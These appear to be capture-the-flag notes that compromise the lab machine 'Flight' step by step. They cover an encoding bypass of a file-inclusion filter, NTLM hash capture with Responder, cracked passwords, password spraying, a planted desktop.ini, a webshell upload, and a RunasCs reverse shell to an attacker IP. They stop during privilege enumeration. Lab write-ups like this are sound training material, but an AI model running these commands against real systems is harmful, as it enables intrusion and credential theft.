@@ -1,0 +1,1180 @@
+10.10.11.187
+
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49667/tcp open  unknown          syn-ack
+49673/tcp open  unknown          syn-ack
+49674/tcp open  unknown          syn-ack
+49690/tcp open  unknown          syn-ack
+49699/tcp open  unknown          syn-ack
+
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-title: g0 Aviation
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-25 16:10:56Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m01s
+| smb2-time: 
+|   date: 2023-01-25T16:11:05
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+
+
+port 80:
+
+order tickets online 
+Apply to out Team!
+
+We are Hiring We are looking for talented engineers specializing in aeronautics. Quick apply to our team by going to the contact page.
+
+Copyright 2022 flight.htb - All Rights Reserved
+
+add flight.htb to /etc/hosts
+
+
+
+
+
+
+try nmap scripts for ldap:
+
+nmap -n -sV --script "ldap* and not brute" -Pn flight.htb
+
+useful info:
+
+|       ldapServiceName: flight.htb:g0$@FLIGHT.HTB
+|       dnsHostName: g0.flight.htb
+
+
+
+I can't connect correctly to smb, ldap giving no useful info
+
+fuzz vhosts:
+
+wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154 
+
+
+000000972:   200        90 L     412 W      3996 Ch     "school"                                                                                                                                                                   
+000003336:   404        9 L      33 W       302 Ch      "gate2"                                                                                                                                                                    
+000003343:   200        14 L     42 W       588 Ch      "p01718h5pjk"                                                                                                                                                              
+000003342:   200        14 L     42 W       582 Ch      "whois"                                                                                                                                                                    
+000003340:   200        0 L      0 W        0 Ch        "img5"                                                                                                                                                                     
+000003339:   200        0 L      0 W        0 Ch        "ip126"                                                                                                                                                                    
+000003338:   200        0 L      0 W        0 Ch        "ip182"                                                                                                                                                                    
+000003341:   200        15 L     54 W       794 Ch      "altair" 
+
+
+I can try some of these, the most useful ones seems to be "school" with the biggest size and "gate2", the other look like false positives
+
+"AVIATION SCHOOL"
+
+I can try to use gobuster again on this vhost
+
+found nothing
+
+If I try to click on home:
+
+http://school.flight.htb/index.php?view=home.html
+
+this could be a Dir trasversal
+
+
+http://school.flight.htb/index.php?view=../../../../../../WINDOWS/repair/sam 
+
+I get:
+
+Suspicious Activity Blocked!
+Incident will be reported
+
+This happens also with http://school.flight.htb/index.php?view=../prova
+
+not with 
+
+http://school.flight.htb/index.php?view=prova
+
+so ../ is seen has a bad char 
+
+not working with double encoding:
+
+http://school.flight.htb/index.php?view=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252e%252e%252fWINDOWS%252frepair%252fsam
+
+It works with UTF-8 encoding:
+
+http://school.flight.htb/index.php?view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%aeSYSTEM/repair/sam
+
+but there is no sam file in this directory
+
+http://school.flight.htb/index.php?view=%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
+
+not working, \ char blocked 
+
+I can still read files without changin path.
+I try to read index.php to understand how the filter works
+
+
+<?php
+
+ini_set('display_errors', 0);
+error_reporting(E_ERROR | E_WARNING | E_PARSE); 
+
+if(isset($_GET['view'])){
+$file=$_GET['view'];
+if ((strpos(urldecode($_GET['view']),'..')!==false)||
+    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
+    (strpos(urldecode($_GET['view']),'\\')!==false)||
+    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
+    (strpos(urldecode($_GET['view']),'.shtml')!==false)
+){
+    echo "<h1>Suspicious Activity Blocked!";
+    echo "<h3>Incident will be reported</h3>\r\n";
+}else{
+    echo file_get_contents($_GET['view']);	
+}
+}else{
+    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
+}
+	
+?>
+
+It decodes all urls
+blocked: \\   ..   htaccess  .shtml  
+
+
+at least I got a path
+
+    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
+
+
+RFI works!:
+
+http://school.flight.htb/index.php?view=http://10.10.16.3:8000/
+
+I could inject a php reverse shell in the page?
+
+Not working because the page is included but not executed
+
+
+I could try to use responder to send a smb request from flight.htb and then crack the hash
+
+https://github.com/SpiderLabs/Responder
+
+(github version not working)
+
+
+
+sudo responder -I tun0 -wPv 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [ON]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.5]
+    Responder IPv6             [dead:beef:2::1003]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-UKOACGVZ2X1]
+    Responder Domain Name      [B5UT.LOCAL]
+    Responder DCE-RPC Port     [48094]
+
+[+] Listening for events...                                                                                                                                                                                                                 
+
+
+
+
+http://school.flight.htb/index.php?view=//10.10.16.3/share
+
+
+
+
+I get:
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:39f194705c01e202:38E8241DC68E0B9C0984138623A45604:010100000000000080C7022FB730D9012D2CE89EC9AB13460000000002000800420035005500540001001E00570049004E002D0055004B004F0041004300470056005A0032005800310004003400570049004E002D0055004B004F0041004300470056005A003200580031002E0042003500550054002E004C004F00430041004C000300140042003500550054002E004C004F00430041004C000500140042003500550054002E004C004F00430041004C000700080080C7022FB730D90106000400020000000800300030000000000000000000000000300000B756EC580F85D36D8BE947547C6DB218822FB26D2600B690795149DA7A9C33AF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000 
+
+hashcat -a 0 -m 5600 svc_apache_hash /usr/share/wordlists/rockyou.txt       
+
+SVC_APACHE::flight:39f194705c01e202:38e8241dc68e0b9c0984138623a45604:010100000000000080c7022fb730d9012d2ce89ec9ab13460000000002000800420035005500540001001e00570049004e002d0055004b004f0041004300470056005a0032005800310004003400570049004e002d0055004b004f0041004300470056005a003200580031002e0042003500550054002e004c004f00430041004c000300140042003500550054002e004c004f00430041004c000500140042003500550054002e004c004f00430041004c000700080080c7022fb730d90106000400020000000800300030000000000000000000000000300000b756ec580f85d36d8be947547c6db218822fb26d2600b690795149da7a9c33af0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000:S@Ss!K@*t13
+
+S@Ss!K@*t13
+
+Now I can try to access using 
+
+evil-winrm -> no
+ps-exec -> no
+wmiexec -> no
+dcomexec -> no
+
+
+I can try to access smb or dump users hashes
+
+dump users hashes:
+
+sudo python3 secretsdump.py flight.htb/svc_apache:'S@Ss!K@*t13'@10.10.11.187
+
+no
+
+
+smbclient -L //flight.htb -U svc_apache%'S@Ss!K@*t13'
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shared          Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+        Web             Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to flight.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+smbmap -u svc_apache -p 'S@Ss!K@*t13' -H 10.10.11.187
+
+
+smbmap -u svc_apache -p 'S@Ss!K@*t13' -H 10.10.11.187
+
+[+] IP: 10.10.11.187:445        Name: flight.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Shared                                                  READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+        Web                                                     READ ONLY
+
+
+smbclient //flight.htb/Web -U svc_apache%'S@Ss!K@*t13'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jan 25 21:32:00 2023
+  ..                                  D        0  Wed Jan 25 21:32:00 2023
+  flight.htb                          D        0  Wed Jan 25 21:32:00 2023
+  school.flight.htb                   D        0  Wed Jan 25 21:32:00 2023
+
+                5056511 blocks of size 4096. 1252422 blocks available
+smb: \> cd flight.htb
+smb: \flight.htb\> dir
+  .                                   D        0  Wed Jan 25 21:32:00 2023
+  ..                                  D        0  Wed Jan 25 21:32:00 2023
+  css                                 D        0  Wed Jan 25 21:32:00 2023
+  images                              D        0  Wed Jan 25 21:32:00 2023
+  index.html                          A     7069  Thu Feb 24 06:58:10 2022
+  js                                  D        0  Wed Jan 25 21:32:00 2023
+
+                5056511 blocks of size 4096. 1252422 blocks available
+smb: \flight.htb\> cd ..
+smb: \> cd school.flight.htb
+smb: \school.flight.htb\> dir
+  .                                   D        0  Wed Jan 25 21:32:00 2023
+  ..                                  D        0  Wed Jan 25 21:32:00 2023
+  about.html                          A     1689  Tue Oct 25 05:54:45 2022
+  blog.html                           A     3618  Tue Oct 25 05:53:59 2022
+  home.html                           A     2683  Tue Oct 25 05:56:58 2022
+  images                              D        0  Wed Jan 25 21:32:00 2023
+  index.php                           A     2092  Thu Oct 27 09:59:25 2022
+  lfi.html                            A      179  Thu Oct 27 09:55:16 2022
+  styles                              D        0  Wed Jan 25 21:32:00 2023
+
+                5056511 blocks of size 4096. 1252422 blocks available
+smb: \school.flight.htb\> get lfi.html
+getting file \school.flight.htb\lfi.html of size 179 as lfi.html (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+smb: \school.flight.htb\> 
+
+Users share:
+
+smb: \> dir
+  .                                  DR        0  Thu Sep 22 22:16:56 2022
+  ..                                 DR        0  Thu Sep 22 22:16:56 2022
+  .NET v4.5                           D        0  Thu Sep 22 21:28:03 2022
+  .NET v4.5 Classic                   D        0  Thu Sep 22 21:28:02 2022
+  Administrator                       D        0  Mon Oct 31 19:34:00 2022
+  All Users                       DHSrn        0  Sat Sep 15 09:28:48 2018
+  C.Bum                               D        0  Thu Sep 22 22:08:23 2022
+  Default                           DHR        0  Tue Jul 20 21:20:24 2021
+  Default User                    DHSrn        0  Sat Sep 15 09:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
+  Public                             DR        0  Tue Jul 20 21:23:25 2021
+  svc_apache                          D        0  Fri Oct 21 20:50:21 2022
+
+smbclient //flight.htb/Shared -U svc_apache%'S@Ss!K@*t13'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Fri Oct 28 22:21:28 2022
+  ..                                  D        0  Fri Oct 28 22:21:28 2022
+
+                5056511 blocks of size 4096. 1252422 blocks available
+
+
+nothing useful in SMB
+
+
+try using crackmapexec
+
+crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --sam --users   
+
+SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)
+SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: H
+SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S
+SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: S
+SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: P
+SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: N
+SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: P
+SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S
+SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: S
+SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: P
+SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: S
+SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: H
+SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J
+SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K
+SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B
+SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B
+
+
+It looks like all the users follow a scheme for usernames 
+I could try to spray the password of svc_apache to other accounts 
+
+crackmapexec smb 192.168.1.101 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
+
+crackmapexec smb 192.168.1.101 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success 
+SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+
+S.Moon:S@Ss!K@*t13
+
+I have other logon credentials
+
+crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares
+
+SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               [+] Enumerated shares
+SMB         10.10.11.187    445    G0               Share           Permissions     Remark
+SMB         10.10.11.187    445    G0               -----           -----------     ------
+SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
+SMB         10.10.11.187    445    G0               C$                              Default share
+SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
+SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
+SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.10.11.187    445    G0               Users           READ            
+SMB         10.10.11.187    445    G0               Web             READ    
+
+
+I have write permissions on Shared but I still cannot access, it looks like there is some custom code that prevents from uploading most types of file
+
+I still have no access to web folder so I can't upload a reverse shell
+
+I go back to smb
+
+smbclient //flight.htb/Users -U s.moon%'S@Ss!K@*t13'
+Try "help" to get a list of possible commands.
+smb: \> id
+id: command not found
+smb: \> dir
+  .                                  DR        0  Thu Sep 22 22:16:56 2022
+  ..                                 DR        0  Thu Sep 22 22:16:56 2022
+  .NET v4.5                           D        0  Thu Sep 22 21:28:03 2022
+  .NET v4.5 Classic                   D        0  Thu Sep 22 21:28:02 2022
+  Administrator                       D        0  Mon Oct 31 19:34:00 2022
+  All Users                       DHSrn        0  Sat Sep 15 09:28:48 2018
+  C.Bum                               D        0  Thu Sep 22 22:08:23 2022
+  Default                           DHR        0  Tue Jul 20 21:20:24 2021
+  Default User                    DHSrn        0  Sat Sep 15 09:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
+  Public                             DR        0  Tue Jul 20 21:23:25 2021
+  svc_apache                          D        0  Fri Oct 21 20:50:21 2022
+
+                5056511 blocks of size 4096. 1250293 blocks available
+smb: \> cd C.Bum
+smb: \C.Bum\> dir
+NT_STATUS_ACCESS_DENIED listing \C.Bum\*
+smb: \C.Bum\>
+
+the only user with a personal dir is C.Bum
+
+
+I could try with scf file
+
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+1) create the file (exp.scf)
+2) setup responder
+
+sudo responder -I tun0 -wPv 
+
+3) upload the file
+
+smb: \> put exp.scf
+NT_STATUS_ACCESS_DENIED opening remote file \exp.scf
+smb: \> 
+
+not working
+
+I could try doing the same by using a desktop.ini file instead of scf. I hope that the .ini extension is not blocked 
+
+smbclient  //flight.htb/Shared -U s.moon%'S@Ss!K@*t13'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jan 25 21:58:10 2023
+  ..                                  D        0  Wed Jan 25 21:58:10 2023
+
+                5056511 blocks of size 4096. 1249605 blocks available
+smb: \> put desktop.ini
+putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 0.2 kb/s)
+smb: \> dir
+  .                                   D        0  Wed Jan 25 22:31:26 2023
+  ..                                  D        0  Wed Jan 25 22:31:26 2023
+  desktop.ini                         A       57  Wed Jan 25 22:31:26 2023
+
+                5056511 blocks of size 4096. 1249605 blocks available
+smb: \> 
+
+
+now I just have t wait to see if user C.Bum open the desktop
+
+yes, on responder:
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:d24e750e9287d0c5:B926318AD54CF8BA6D03259FEA2040D5:01010000000000000012113DD030D90100666FA76B02A38E0000000002000800570030003400540001001E00570049004E002D00320033004900340036004600550046004E004600560004003400570049004E002D00320033004900340036004600550046004E00460056002E0057003000340054002E004C004F00430041004C000300140057003000340054002E004C004F00430041004C000500140057003000340054002E004C004F00430041004C00070008000012113DD030D90106000400020000000800300030000000000000000000000000300000B756EC580F85D36D8BE947547C6DB218822FB26D2600B690795149DA7A9C33AF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000  
+
+
+hashcat -a 0 -m 5600 cbum_hash /usr/share/wordlists/rockyou.txt
+
+C.BUM::flight.htb:d24e750e9287d0c5:b926318ad54cf8ba6d03259fea2040d5:01010000000000000012113dd030d90100666fa76b02a38e0000000002000800570030003400540001001e00570049004e002d00320033004900340036004600550046004e004600560004003400570049004e002d00320033004900340036004600550046004e00460056002e0057003000340054002e004c004f00430041004c000300140057003000340054002e004c004f00430041004c000500140057003000340054002e004c004f00430041004c00070008000012113dd030d90106000400020000000800300030000000000000000000000000300000b756ec580f85d36d8be947547c6db218822fb26d2600b690795149da7a9c33af0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000:Tikkycoll_431012284
+
+
+c.bum:Tikkycoll_431012284
+
+I still cannot access through evil-winrm ecc..
+
+
+smbmap -u c.bum -p 'Tikkycoll_431012284' -H 10.10.11.187     
+
+[+] IP: 10.10.11.187:445        Name: flight.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Shared                                                  READ, WRITE
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+        Web                                                     READ, WRITE
+
+
+c.bum has write access to Web too 
+so now I should be able to upload a php file with a webshell
+
+
+smbclient //flight.htb/Web -U c.bum%'Tikkycoll_431012284'
+Try "help" to get a list of possible commands.
+smb: \> cd flight.htb\
+smb: \flight.htb\> put revshell.php 3.php
+putting file revshell.php as \flight.htb\3.php (19.9 kb/s) (average 19.9 kb/s)
+smb: \flight.htb\> 
+
+
+revshell not executing, maybe antivirus ?
+
+
+p0wny@shell:C:\xampp\htdocs\flight.htb# whoami
+flight\svc_apache
+
+now I have shell as svc_apache
+I have credentials as c.bum so I have to access as this user 
+
+I can use runas.exe (windows builtin) or use 
+
+https://github.com/antonioCoco/RunasCs/releases/tag/v1.4
+
+that uses runas but let me use explicit cedentials...
+
+smb: \flight.htb\> put RunasCs.exe 
+putting file RunasCs.exe as \flight.htb\RunasCs.exe (69.9 kb/s) (average 54.1 kb/s)
+smb: \flight.htb\> 
+
+
+
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.16.5:8080
+
+
+
+nc -lvnp 8080            
+listening on [any] 8080 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.187] 50436
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+flight\c.bum
+PS C:\Windows\system32> 
+
+
+PS C:\Windows\system32> cd c:\users\c.bum\desktop
+cd c:\users\c.bum\desktop
+PS C:\users\c.bum\desktop> type user.txt
+type user.txt
+148c8834e79965253f8acf1597e8b049
+PS C:\users\c.bum\desktop> 
+
+PS C:\users\c.bum\desktop> cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+* NONE *
+PS C:\users\c.bum\desktop> whoami /group
+whoami /group
+ERROR: Invalid argument/option - '/group'.
+Type "WHOAMI /?" for usage.
+PS C:\users\c.bum\desktop> whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192   
+
+
+
+
+PS C:\users\c.bum\desktop> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+PS C:\users\c.bum\desktop> net user /domain
+net user /domain
+
+User accounts for \\G0
+
+-------------------------------------------------------------------------------
+Administrator            C.Bum                    krbtgt                   
+The command completed successfully.
+
+
+PS C:\users\c.bum\desktop> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+System Type:               x64-based PC
+
+
+
+PS C:\users\c.bum\desktop> netstat -a | findstr LISTENING
+netstat -a | findstr LISTENING
+  TCP    0.0.0.0:80             g0:0                   LISTENING
+  TCP    0.0.0.0:88             g0:0                   LISTENING
+  TCP    0.0.0.0:135            g0:0                   LISTENING
+  TCP    0.0.0.0:389            g0:0                   LISTENING
+  TCP    0.0.0.0:443            g0:0                   LISTENING
+  TCP    0.0.0.0:445            g0:0                   LISTENING
+  TCP    0.0.0.0:464            g0:0                   LISTENING
+  TCP    0.0.0.0:593            g0:0                   LISTENING
+  TCP    0.0.0.0:636            g0:0                   LISTENING
+  TCP    0.0.0.0:3268           g0:0                   LISTENING
+  TCP    0.0.0.0:3269           g0:0                   LISTENING
+  TCP    0.0.0.0:5985           g0:0                   LISTENING
+  TCP    0.0.0.0:8000           g0:0                   LISTENING
+  TCP    0.0.0.0:9389           g0:0                   LISTENING
+  TCP    0.0.0.0:47001          g0:0                   LISTENING
+  TCP    0.0.0.0:49664          g0:0                   LISTENING
+  TCP    0.0.0.0:49665          g0:0                   LISTENING
+  TCP    0.0.0.0:49666          g0:0                   LISTENING
+  TCP    0.0.0.0:49667          g0:0                   LISTENING
+  TCP    0.0.0.0:49673          g0:0                   LISTENING
+  TCP    0.0.0.0:49674          g0:0                   LISTENING
+  TCP    0.0.0.0:49687          g0:0                   LISTENING
+  TCP    0.0.0.0:49690          g0:0                   LISTENING
+  TCP    0.0.0.0:49699          g0:0                   LISTENING
+  TCP    10.10.11.187:53        g0:0                   LISTENING
+  TCP    10.10.11.187:139       g0:0                   LISTENING
+  TCP    127.0.0.1:53           g0:0                   LISTENING
+  TCP    [::]:80                g0:0                   LISTENING
+  TCP    [::]:88                g0:0                   LISTENING
+  TCP    [::]:135               g0:0                   LISTENING
+  TCP    [::]:389               g0:0                   LISTENING
+  TCP    [::]:443               g0:0                   LISTENING
+  TCP    [::]:445               g0:0                   LISTENING
+  TCP    [::]:464               g0:0                   LISTENING
+  TCP    [::]:593               g0:0                   LISTENING
+  TCP    [::]:636               g0:0                   LISTENING
+  TCP    [::]:3268              g0:0                   LISTENING
+  TCP    [::]:3269              g0:0                   LISTENING
+  TCP    [::]:5985              g0:0                   LISTENING
